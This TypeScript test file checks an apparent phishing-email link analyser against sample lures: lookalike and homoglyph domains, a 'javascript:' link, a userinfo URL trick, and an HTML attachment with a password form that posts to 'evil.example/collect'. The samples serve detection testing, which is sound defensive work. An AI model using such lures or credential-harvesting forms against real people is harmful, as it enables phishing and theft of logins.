import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { test } from "node:test";
import { BRANDS } from "../data/brands.ts";
import type { ParsedEmail } from "../email.ts";
import { parseEmail } from "../mime/parse.ts";
import { parseTestHtml as parse } from "../testing/dom.ts";
import type { Reference } from "../urls/lookalike.ts";
import { analyzeLinks, isClickable } from "./analyze.ts";

const references: Reference[] = BRANDS.flatMap((b) => b.domains.map((domain) => ({ domain, own: false })));
const run = (email: ParsedEmail, fromDomain: string | null) =>
  analyzeLinks(email, email.html ? parse(email.html) : null, { fromDomain, references });
const fixture = (name: string) => parseEmail(readFileSync(new URL(`../../../fixtures/${name}`, import.meta.url)));
const htmlEmail = (html: string | null, text: string | null = null): ParsedEmail => ({
  source: "eml", headers: [], text, html, attachments: [], raw: "", warnings: [],
});

test("finds the deceptive Safe Links link and the pixel in the spoofed invoice", () => {
  const report = run(fixture("spoofed-invoice.eml"), "rhone-energie.fr");
  const anchor = report.links.find((l) => l.origin === "a");
  assert.equal(anchor?.shownHost, "espace-client.rhone-energie.fr");
  assert.equal(anchor?.url.final, "https://rhone-energie.fr.secure-login.click/auth?u=j.martin");
  assert.equal(anchor?.url.wrappers[0].service, "Microsoft Safe Links");
  assert.equal(report.links.find((l) => l.origin === "img")?.tracking, "pixel");
  assert.deepEqual(
    report.links.filter((l) => l.source === "text").map((l) => l.url.final),
    ["https://espace-client.rhone-energie.fr/"],
  );
  assert.deepEqual(report.findings.map((f) => f.id), [
    "link.deceptive",
    "url.disguised-domain",
    "url.abused-tld",
    "html.tracking-pixel",
  ]);
  assert.ok(report.findings[0].evidence.includes('"https://espace-client.rhone-energie.fr" → https://rhone-energie.fr.secure-login.click/auth?u=j.martin'));
});

test("stays silent on the clean newsletter, whose pixel is its mailing service's", () => {
  const report = run(fixture("clean-newsletter.eml"), "librairie-exemple.fr");
  assert.equal(report.links.find((l) => l.origin === "img")?.tracking, "tracker");
  assert.deepEqual(report.findings, []);
});

test("catches the PayPal lookalike's tricks", () => {
  const report = run(fixture("lookalike-paypal.eml"), "xn--pypal-4ve.com");
  assert.deepEqual(report.findings.map((f) => f.id).sort(), [
    "html.broken-words",
    "html.password-form",
    "link.hidden",
    "url.lookalike",
    "url.shortener",
  ]);
  const lookalike = report.findings.find((f) => f.id === "url.lookalike");
  assert.deepEqual(lookalike?.evidence, ["pаypal.com (xn--pypal-4ve.com) imitates paypal.com", "paypa1.com imitates paypal.com"]);
  assert.equal(report.forms[0].hasPassword, true);
});

test("ignores pixels from the sender's own organisation and in-page anchors", () => {
  const report = run(
    htmlEmail(`<a href="#top">top</a><img src="https://news.shop.example/o.gif" width="1" height="1">`),
    "shop.example",
  );
  assert.deepEqual(report.findings, []);
  assert.equal(report.links.length, 1);
  assert.equal(isClickable(report.links[0]), false);
});

test("reports script links and user-name tricks", () => {
  const report = run(
    htmlEmail(`<a href="javascript:alert(1)">x</a><a href="https://www.paypal.com@evil.example/">PayPal</a>`),
    null,
  );
  assert.deepEqual(report.findings.map((f) => f.id), ["url.javascript-url", "url.userinfo"]);
});

test("reads links from a text-only body", () => {
  const report = run(htmlEmail(null, "Cliquez https://bit.ly/abc."), null);
  assert.deepEqual(report.links.map((l) => [l.origin, l.url.final]), [["text", "https://bit.ly/abc"]]);
  assert.deepEqual(report.findings.map((f) => f.id), ["url.shortener"]);
});

test("analyses links, QR codes and forms found in attachments", () => {
  const report = analyzeLinks(htmlEmail(null), null, { fromDomain: null, references }, [
    {
      name: "login.html",
      html: parse(`<form action="https://evil.example/collect" method="post"><input type="password" name="p"></form>
        <a href="https://bit.ly/x">https://www.paypal.com</a>`),
      urls: [],
      qr: [],
    },
    { name: "terms.pdf", html: null, urls: ["https://paypa1.com/doc"], qr: [] },
    { name: "mfa.png", html: null, urls: [], qr: ["https://evil.example/qr", "WIFI:S:office;;"] },
  ]);
  assert.deepEqual(
    report.links.map((l) => [l.source, l.attachment, l.origin, l.url.final]),
    [
      ["attachment", "login.html", "form", "https://evil.example/collect"],
      ["attachment", "login.html", "a", "https://bit.ly/x"],
      ["attachment", "terms.pdf", "file", "https://paypa1.com/doc"],
      ["attachment", "mfa.png", "qr", "https://evil.example/qr"],
    ],
  );
  assert.equal(report.forms[0].attachment, "login.html");
  const password = report.findings.find((f) => f.id === "html.password-form");
  assert.equal(password?.title, "Password form in an attachment");
  assert.deepEqual(password?.evidence, ["POST https://evil.example/collect — p (in login.html)"]);
  assert.deepEqual(report.findings.map((f) => f.id), [
    "link.deceptive",
    "url.lookalike",
    "url.shortener",
    "html.password-form",
  ]);
});
